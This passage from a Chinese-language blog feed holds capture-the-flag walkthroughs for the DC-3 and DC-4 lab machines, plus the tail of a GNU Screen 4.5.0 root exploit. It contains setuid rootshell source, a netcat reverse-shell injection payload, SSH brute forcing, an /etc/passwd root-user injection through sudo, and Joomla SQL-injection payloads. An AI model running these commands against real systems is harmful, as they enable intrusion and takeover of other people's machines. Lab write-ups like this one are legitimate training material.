<p>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41152.txt<br>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41154.sh</p>
<hr>
<p>Shellcodes: No Results<br>kali@kali2020:<del>/Tools$ cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh<br>kali@kali2020:</del>/Tools$ cat 41154.sh </p>
</blockquote>
<p>根据说明第一部分保存为<code>libhax.c</code></p>
<blockquote>
<p>#include &lt;stdio.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;unistd.h&gt;<br><strong>attribute</strong> ((<strong>constructor</strong>))<br>void dropshell(void){<br>    chown(“/tmp/rootshell”, 0, 0);<br>    chmod(“/tmp/rootshell”, 04755);<br>    unlink(“/etc/ld.so.preload”);<br>    printf(“[+] done!\n”);<br>}</p>
</blockquote>
<p>第二部分保存为<code>rootshell.c</code></p>
<blockquote>
<p>#include &lt;stdio.h&gt;<br>int main(void){<br>    setuid(0);<br>    setgid(0);<br>    seteuid(0);<br>    setegid(0);<br>    execvp(“/bin/sh”, NULL, NULL);<br>}</p>
</blockquote>
<p>编译</p>
<p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
<p><code>gcc -o rootshell rootshell.c</code></p>
<p>将第三部分保存为exp.sh</p>
<br>

<br>

<p>把三个文件通过蚁剑传到靶机中<br><img src="/posts/7a861522/upload.png"><br><img src="/posts/7a861522/exp.png"><br><img src="/posts/7a861522/flag.png"></p>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges4</title>
    <url>/posts/d8125b4/</url>
    <content><![CDATA[<ul>
<li>环境</li>
</ul>
<blockquote>
<p>网段 192.168.18.0/24<br>kali   192.168.18.131<br>靶机 192.168.18.135</p>
</blockquote>
<p>nmap扫描网段</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:06 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00038s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.135<br>Host is up (0.00022s latency).<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00016s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds</p>
</blockquote>
<p>nmap扫描靶机开放的端口</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.135 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:09 CST<br>Nmap scan report for 192.168.18.135<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    nginx 1.15.10<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</p>
</blockquote>
<p>dirsearch扫一下目录</p>
<blockquote>
<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.135 </p>
<p>[11:14:19] Starting:<br>[11:14:25] 302 -  704B  - /command.php  -&gt;  index.php<br>[11:14:25] 301 -  170B  - /css  -&gt;  <a href="http://192.168.18.135/css/">http://192.168.18.135/css/</a><br>[11:14:26] 301 -  170B  - /images  -&gt;  <a href="http://192.168.18.135/images/">http://192.168.18.135/images/</a><br>[11:14:26] 403 -  556B  - /images/<br>[11:14:26] 200 -  506B  - /index.php<br>[11:14:27] 302 -  206B  - /login.php  -&gt;  index.php<br>[11:14:27] 302 -  163B  - /logout.php  -&gt;  index.php</p>
</blockquote>
<p>进主页看到一个登录框</p>
<p><img src="/posts/d8125b4/index.png"></p>
<p>burp爆破admin得到密码<code>happy</code></p>
<p>登录后发现可以执行一些命令</p>
<p><img src="/posts/d8125b4/command.png"><br>burp抓包看一下<br><img src="/posts/d8125b4/burp_whoami.png"><br><br><br><img src="/posts/d8125b4/burp_catpasswd.png"><br><br><br>反弹shell<br><img src="/posts/d8125b4/kali_nc.png"></p>
<blockquote>
<p>kali@kali2020:~$ nc -lvp 8888</p>
</blockquote>
<p>burp改包<br><img src="/posts/d8125b4/burp_nc.png"><br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run</p>
<p>使用python得到交互式shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="/posts/d8125b4/shell.png"></p>
<blockquote>
<p>kali@kali2020:~$ nc -lvp 8888<br>listening on [any] 8888 …<br>192.168.18.135: inverse host lookup failed: Unknown host<br>connect to [192.168.18.131] from (UNKNOWN) [192.168.18.135] 48192<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’<br>www-data@dc-4:/usr/share/nginx/html$ whoami<br>whoami<br>www-data<br>www-data@dc-4:/usr/share/nginx/html$ </p>
</blockquote>
<p><code>cat /etc/passwd</code></p>
<p>发现有三个用户</p>
<blockquote>
<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
</blockquote>
<p>看下charles用户有什么</p>
<blockquote>
<p>**www-data@dc-4:/home$ cd charles **</p>
<p>cd charles<br><strong>www-data@dc-4:/home/charles$ ls</strong><br>ls<br><strong>www-data@dc-4:/home/charles$ ls -l</strong><br>ls -l<br>total 0<br><strong>www-data@dc-4:/home/charles$ cd ls</strong><br>cd ls<br>bash: cd: ls: No such file or directory<br><strong>www-data@dc-4:/home/charles$ cat ls</strong><br>cat ls<br>cat: ls: No such file or directory<br>**www-data@dc-4:/home/charles$ **</p>
</blockquote>
<p>查看jim用户有什么,mbox没权限访问</p>
<blockquote>
<p>**www-data@dc-4:~$ cd /home/jim  **<br>cd /home/jim<br><strong>www-data@dc-4:/home/jim$ ls</strong><br>ls<br>backups  mbox  test.sh</p>
<p><strong>www-data@dc-4:/home/jim$ cat mbox</strong><br>cat mbox<br>cat: mbox: Permission denied<br>**www-data@dc-4:/home/jim$ **<br><strong>www-data@dc-4:/home/jim$ cd backups</strong><br>cd backups<br><strong>www-data@dc-4:/home/jim/backups$ ls</strong><br>ls<br>old-passwords.bak<br><strong>www-data@dc-4:/home/jim/backups$ cat old-passwords.bak</strong><br>cat old-passwords.bak</p>
<p>… … </p>
</blockquote>
<p>把密码保存在dc4_passwd.txt</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo hydra -l jim -P ~/Tools/dc4_passwd.txt ssh://192.168.18.135</p>
<p>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</p>
<p>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2021-05-02 22:25:29<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task<br>[DATA] attacking ssh://192.168.18.135:22/<br>[STATUS] 181.00 tries/min, 181 tries in 00:01h, 77 to do in 00:01h, 16 active</p>
<p>[22][ssh] host: 192.168.18.135   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) finished at 2021-05-02 22:27:02</p>
</blockquote>
<p>得到 <code>jim  jibril04</code></p>
<p>连接ssh</p>
<blockquote>
<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#x69;&#109;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x31;&#x38;&#46;&#49;&#x33;&#x35;">&#106;&#x69;&#109;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x31;&#x38;&#46;&#49;&#x33;&#x35;</a></strong></p>
<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x6a;&#105;&#x6d;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#x38;&#x2e;&#x31;&#x33;&#x35;">&#x6a;&#105;&#x6d;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#x38;&#x2e;&#x31;&#x33;&#x35;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
<p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
<p><strong>jim@dc-4:~$ pwd</strong></p>
<p>/home/jim</p>
<p>##看看有什么可以使用的root权限命令</p>
<p><strong>jim@dc-4:~$ sudo -l</strong></p>
<p>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#1) Respect the privacy of others.</span><br><span class="line">#2) Think before you type.</span><br><span class="line">#3) With great power comes great responsibility.</span><br></pre></td></tr></table></figure>

<p>[sudo] password for jim:<br>Sorry, try again.<br>[sudo] password for jim:<br>Sorry, user jim may not run sudo on dc-4.<br>**jim@dc-4:~$ **</p>
<p><strong>jim@dc-4:~$ ls -l</strong><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rw——- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><strong>jim@dc-4:~$ cat mbox</strong></p>
<p>From root@dc-4 Sat Apr 06 20:20:04 2019<br>Return-path: &lt;root@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000<br>Received: from root by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;root@dc-4&gt;)<br>        id 1hCiQe-0000gc-EC<br>        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000<br>To: jim@dc-4<br>Subject: Test<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;<br>From: root &lt;root@dc-4&gt;<br>Date: Sat, 06 Apr 2019 20:20:04 +1000<br>Status: RO</p>
<p>This is a test.</p>
</blockquote>
<p>可以看到jim发了一条电子邮件</p>
<p>去看一下./var/mail</p>
<blockquote>
<p><strong>jim@dc-4:~$ cd /var/mail</strong><br><strong>jim@dc-4:/var/mail$ ls</strong><br>jim<br><strong>jim@dc-4:/var/mail$ cd jim</strong><br>-bash: cd: jim: Not a directory<br><strong>jim@dc-4:/var/mail$ cat jim</strong><br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=”UTF-8”<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O</p>
<p>Hi Jim,</p>
<p>I’m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</p>
<p>Password is:  <strong>^xHhA&amp;hvim0y</strong></p>
<p>See ya,<br>Charles</p>
<p>**jim@dc-4:/var/mail$ **</p>
</blockquote>
<p>发现了Charles的密码<code>^xHhA&amp;hvim0y</code></p>
<p>su看看能否切换到charles</p>
<blockquote>
<p><strong>jim@dc-4:~$ su charles</strong></p>
<p>Password:<br>**charles@dc-4:/home/jim$ **</p>
</blockquote>
<p>看看Charles有什么可以使用的root命令</p>
<blockquote>
<p><strong>charles@dc-4:~$ sudo -l</strong><br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br>**charles@dc-4:~$ **</p>
</blockquote>
<p>发现可以不使用密码就能执行<code>teehee</code></p>
<p>搜了一下 可以利用<code>teehee</code>进行提权</p>
<blockquote>
<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
</blockquote>
<p><img src="/posts/d8125b4/teeheeuser.png"></p>
<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
<p>七个字段</p>
<p>root:x:0:0:root:/root:/bin/bash</p>
<p>Mamor:x:0:0:::/bin/bash</p>
<p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
<blockquote>
<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#x4d;&#97;&#x6d;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#x31;&#x38;&#46;&#49;&#x33;&#x35;">&#x4d;&#97;&#x6d;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#x31;&#x38;&#46;&#49;&#x33;&#x35;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#97;&#x6d;&#x6f;&#x72;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;">&#77;&#97;&#x6d;&#x6f;&#x72;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#56;&#46;&#49;&#51;&#x35;">&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#56;&#46;&#49;&#51;&#x35;</a>‘s password: </p>
<p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
</blockquote>
<p>构造失败，重新构造一个</p>
<blockquote>
<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
<p>………….</p>
<p>Mamor111::0:0:::/bin/bash</p>
<p><strong>charles@dc-4:~$ echo “Mamor111::0:0:::/bin/bash” |sudo teehee -a /etc/passwd</strong></p>
<p>Mamor111::0:0:::/bin/bash<br><strong>charles@dc-4:~$ su Mamor111</strong></p>
<p><strong>root@dc-4:/home/charles# ls</strong><br><strong>root@dc-4:/home/charles# cd ../</strong><br><strong>root@dc-4:/home# ls</strong><br>charles  jim  sam<br><strong>root@dc-4:/home# cd ../</strong><br><strong>root@dc-4:/# ls</strong><br>bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz<br>boot  home        lib             mnt    root  srv   usr  vmlinuz.old<br>dev   initrd.img  lost+found      opt    run   sys   var<br><strong>root@dc-4:/# cd root</strong><br><strong>root@dc-4:/root# ls</strong><br>flag.txt<br><strong>root@dc-4:/root# cat flag.txt</strong></p>
<p>888       888          888 888      8888888b.                             888 888 888 888<br>888   o   888          888 888      888  “Y88b                            888 888 888 888<br>888  d8b  888          888 888      888    888                            888 888 888 888<br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888<br>888d88888b888 d8P  Y8b 888 888      888    888 d88””88b 888 “88b d8P  Y8b 888 888 888 888<br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P<br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      “   “   “   “<br>888P     Y888  “Y8888  888 888      8888888P”   “Y88P”  888  888  “Y8888  888 888 888 888 </p>
<p>Congratulations!!!</p>
<p>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.</p>
<p>If you enjoyed this CTF, send me a tweet via @DCAU7.<br>**root@dc-4:/root# **</p>
</blockquote>
<br>
<br>

<p>总结</p>
<ul>
<li>nmap扫网段，靶机端口</li>
<li>dirsearch扫目录</li>
<li>burpsuite爆破后台</li>
<li>进入后台发现能执行部分命令并抓包修改发现能命令执行</li>
<li>反弹shell<blockquote>
<p>反弹shell<br>kali@kali2020:~$ nc -lvp 8888<br>burp改包<br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run<br>使用python得到交互式shell<br>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
</blockquote>
</li>
<li>cat /etc/passwd 发现三个用户，并查看信息</li>
<li>ssh用户爆破</li>
<li><strong>teehee提权</strong><blockquote>
<p>teehee可通过echo “xxx”|sudo teehee -a ‘file’的方式将内容写入到用户无法直接操作的文件中</p>
</blockquote>
</li>
<li>创建管理员身份并切换</li>
<li>得到flag</li>
</ul>
<br>

<br>

<br>

<br>

<p>Reference</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p>
<p><a href="https://www.pianshen.com/article/9999990100/">https://www.pianshen.com/article/9999990100/</a></p>
<p><a href="https://blog.csdn.net/Nicky_Zheng/article/details/113173929">https://blog.csdn.net/Nicky_Zheng/article/details/113173929</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>proxychain4配置——虚拟机无法正常走代理</title>
    <url>/posts/45d6c023/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>DCchallenges3</title>
    <url>/posts/93e5b017/</url>
    <content><![CDATA[<ul>
<li>环境</li>
</ul>
<blockquote>
<p>网段 192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>靶机 192.168.18.134</p>
</blockquote>
<p>nmap扫描网段</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:09 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00010s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.134<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:83:96:86 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00033s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.01 seconds</p>
</blockquote>
<p>扫描靶机开放端口</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.134 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:11 CST<br>Nmap scan report for 192.168.18.134<br>Host is up (0.0014s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>MAC Address: 00:0C:29:83:96:86 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds</p>
</blockquote>
<p>只开放了80端口</p>
<p>dirsearch扫一下目录</p>
<blockquote>
<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.134:80</p>
<br>

<p>扫到了管理员登录页面</p>
<p><a href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a></p>
</blockquote>
<p>打开主页有说明</p>
<blockquote>
<p>Welcome to DC-3.</p>
<p>This time, there is only one flag, one entry point and no clues.</p>
<p>To get the flag, you’ll obviously have to gain root privileges.</p>
<p>How you get to be root is up to you - and, obviously, the system.</p>
<p>Good luck - and I hope you enjoy this little challenge.  :-)</p>
</blockquote>
<p>这次只有一个flag相应得到flag就要得到root权限</p>
<p>访问administrator页面，可以看到是Joomla搭建的平台</p>
<p>在网上搜了下发现有一款JoomScan，安装<code>sudo git clone https://github.com/rezasp/joomscan.git</code></p>
<blockquote>
<p>perl joomscan.pl -u 192.168.18.134  </p>
<p>[+] FireWall Detector<br>[++] Firewall not detected</p>
<p>[+] Detecting Joomla Version<br>[++] Joomla 3.7.0</p>
<p>[+] Core Joomla Vulnerability<br>[++] Target Joomla core is not vulnerable                                                     </p>
<p>[+] Checking Directory Listing<br>[++] directory has directory listing :<br><a href="http://192.168.18.134/administrator/components">http://192.168.18.134/administrator/components</a><br><a href="http://192.168.18.134/administrator/modules">http://192.168.18.134/administrator/modules</a><br><a href="http://192.168.18.134/administrator/templates">http://192.168.18.134/administrator/templates</a><br><a href="http://192.168.18.134/images/banners">http://192.168.18.134/images/banners</a>                                                          </p>
<p>[+] Checking apache info/status files<br>[++] Readable info/status files are not found                                                 </p>
<p>[+] admin finder<br>[++] Admin page : <a href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a>                                        </p>
<p>[+] Checking robots.txt existing<br>[++] robots.txt is not found                                                                  </p>
<p>[+] Finding common backup files name<br>[++] Backup files are not found                                                               </p>
<p>[+] Finding common log files name<br>[++] error log is not found                                                                   </p>
<p>[+] Checking sensitive config.php.x file<br>[++] Readable config files are not found                                                      </p>
<p>Your Report : reports/192.168.18.134/                                 </p>
</blockquote>
<p>发现Joomal版本为3.7.0</p>
<p>网上搜索相关漏洞发现存在SQL注入</p>
<br>

<blockquote>
<p>kali@kali2020:~/Tools$ sudo searchsploit joomla 3.7.0</p>
<hr>
<p> Exploit Title                                              |  Path</p>
<hr>
<p>Joomla! 3.7.0 - ‘com_fields’ SQL Injection                  | php/webapps/42033.txt<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripti | php/webapps/43488.txt</p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<p><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
<blockquote>
<p>#Exploit Title: Joomla 3.7.0 - Sql Injection</p>
<p>#Date: 05-19-2017</p>
<p>#Exploit Author: Mateus Lino</p>
<p>#Reference: <a href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a></p>
<p>#Vendor Homepage: <a href="https://www.joomla.org/">https://www.joomla.org/</a></p>
<p>#Version: = 3.7.0</p>
<p>#Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</p>
<p>#CVE : - CVE-2017-8917</p>
<p>URL Vulnerable: <a href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml%27">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</a></p>
<p>Using Sqlmap: </p>
<p>sqlmap -u “<a href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent –dbs -p list[fullordering]</p>
<p>Parameter: list[fullordering] (GET)<br>    Type: boolean-based blind<br>    Title: Boolean-based blind - Parameter replace (DUAL)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</p>
<p>   Type: error-based<br>   Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</p>
<p>   Type: AND/OR time-based blind<br>   Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SEL</p>
</blockquote>
<br>

<p>给出了存在sql注入的url</p>
<p><code>http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</code></p>
<p>sqlmap注入命令</p>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
<p>存在的sql注入类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Type: boolean-based blind</span><br><span class="line">Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(CASE WHEN (1573&#x3D;1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END) </span><br><span class="line">Type: error-based</span><br><span class="line">Title: MySQL &gt;&#x3D; 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT 6600 FROM(SELECT COUNT(),CONCAT(0x7171767071,(SELECT (ELT(6600&#x3D;6600,1))),0x716a707671,FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)  </span><br><span class="line">Type: AND&#x2F;OR time-based blind</span><br><span class="line">Title: MySQL &gt;&#x3D; 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT * FROM (SEL</span><br></pre></td></tr></table></figure>

<p>sqlmap -u “<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –random-agent –batch –dbs -p list[fullordering]</p>
<p>得到数据库</p>
<blockquote>
<p>available databases [5]:<br>[*] information_schema<br>[*] joomladb<br>[*] mysql<br>[*] performance_schema<br>[*] sys</p>
</blockquote>
<p>查表名</p>
<p>sqlmap -u “<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –random-agent –batch -D joomladb –tables -p list[fullordering]</p>
<blockquote>
